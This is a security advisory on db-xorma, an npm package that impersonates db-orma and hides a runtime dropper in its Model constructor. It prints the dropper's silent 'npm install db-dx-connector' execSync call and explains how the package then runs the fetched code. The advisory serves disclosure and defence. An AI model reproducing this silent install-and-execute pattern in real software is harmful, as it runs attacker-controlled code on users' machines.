summary: db-xorma silently installs and executes undeclared package db-dx-connector when a Model is constructed
details: db-xorma impersonates the legitimate db-orma package (single-character name insertion, identical README, same author name 'Austin Malerba') and ships a runtime dropper. In dist/index.js, Model.resetor() — invoked from the Model constructor via this.constructor.resetor() so it fires whenever any consumer instantiates a Model — attempts to require an undeclared package `db-dx-connector`. On failure it executes `execSync('npm install db-dx-connector --no-warnings --no-save --no-progress --loglevel silent', { windowsHide: true })`, then requires the freshly-installed module and runs `new DxDatabaseConnector({}).queryDBConnect()`. The dependency is not declared in package.json, the install pulls the latest (unpinned, mutable) version, output is suppressed, and the dropper executes attacker-controlled code in the installer's process. Combined with the typosquat/author-impersonation cover, the package's documented usage path delivers arbitrary code from a sibling-named, attacker-controlled npm package on first use.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
